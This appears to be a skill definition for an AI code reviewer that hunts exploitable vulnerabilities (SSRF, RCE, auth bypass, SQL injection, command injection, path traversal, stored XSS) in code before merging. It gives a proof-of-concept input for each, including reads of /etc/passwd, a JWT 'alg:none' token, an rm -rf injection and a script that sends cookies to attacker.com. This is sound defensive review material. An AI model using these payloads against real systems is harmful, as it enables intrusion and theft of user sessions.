---
name: security-bounty-hunter
description: Focuses exclusively on exploitable vulnerabilities with proof of concept. Use before merging features that handle authentication, permissions, external data input, or system I/O.
---

# Security Bounty Hunter

Unlike security-review (broad coverage), this command focuses only on **exploitable** vulnerabilities — those an attacker could use to compromise the system.

Ignored: purely local issues, self-XSS without access to third-party accounts, missing security headers in isolation, debug information in dev environments.

---

## Analysis scope

### 1. SSRF (Server-Side Request Forgery)

**Question:** does the code make HTTP requests based on user input?

```
Look for: fetch(url), http.Get(url), curl, file_get_contents(url)
where `url` derives from: query params, body, headers, database data loaded from external input
```

**PoC template:**
```
Input: url=http://169.254.169.254/latest/meta-data/
Expected result: error or rejection
Vulnerable result: response from the AWS metadata API
```

### 2. RCE (Remote Code Execution)

**Question:** does the code execute system commands with user input?

```
Look for: exec(), system(), os.system(), subprocess with shell=True, eval(), Function()
where any argument derives from external input
```

**PoC template:**
```
Input: filename=; cat /etc/passwd
Expected result: validation error
Vulnerable result: contents of /etc/passwd in the output
```

### 3. Auth bypass

**Question:** is it possible to access protected resources without valid authentication?

Common vectors:
- JWT with `alg: none`
- Token verification only on the frontend
- Endpoints that check role but not authentication
- Race condition in permission checks

**PoC template:**
```
Request: GET /api/admin/users without a token
or with token: {"alg":"none","typ":"JWT"}.payload.
Expected result: 401 or 403
Vulnerable result: data returned
```

### 4. SQL Injection

**Question:** does any user input reach a query without parameterization?

```
Look for: string formatting with variables in SQL, concatenation, sprintf with SELECT/INSERT/UPDATE
```

**PoC template:**
```
Input: id=1' OR '1'='1
Expected result: validation error or parameterized query ignoring the injection
Vulnerable result: data from other rows returned
```

### 5. Command Injection

**Question:** does user input pass through a shell without sanitization?

**PoC template:**
```
Input: filename=test.txt; rm -rf /tmp/test
Expected result: error, or execution of only `filename` as an argument
Vulnerable result: additional command executed
```

### 6. Path Traversal

**Question:** does the code open files with paths that include user input?

**PoC template:**
```
Input: file=../../etc/passwd
Expected result: error or rejection
Vulnerable result: file contents returned
```

### 7. Auto-triggerable XSS

**Question:** is stored input rendered without escaping in another user's context?

**PoC template:**
```
Stored input: <script>fetch('https://attacker.com/'+document.cookie)</script>
Expected result: input escaped on render
Vulnerable result: script executed in another user's browser
```

---

## Analysis flow

1. **Triage:** list every external data entry point (HTTP params, body, headers, files, env vars)
2. **Entrypoints:** for each entrypoint, trace the path to: SQL query, command exec, file open, outgoing HTTP request, HTML render
3. **Static analysis:** check whether each path has validation/sanitization
4. **PoC:** for each suspicious path, build the minimal PoC
5. **Exploitability:** classify as exploitable (PoC works), potential (path exists but unconfirmed), or false positive

---

## Output

For each vulnerability found:

```
VULNERABILITY: [type]
FILE: [path:line]
ENTRYPOINT: [how the data arrives]
PATH: [entrypoint → sink]
POC: [input demonstrating the exploit]
IMPACT: [what an attacker can do]
MITIGATION: [specific fix]
```

**Final verdict:** `[N] exploitable vulnerabilities found — [list of types]`

Empty verdict = `NO EXPLOITABLE VULNERABILITY FOUND`
</output>
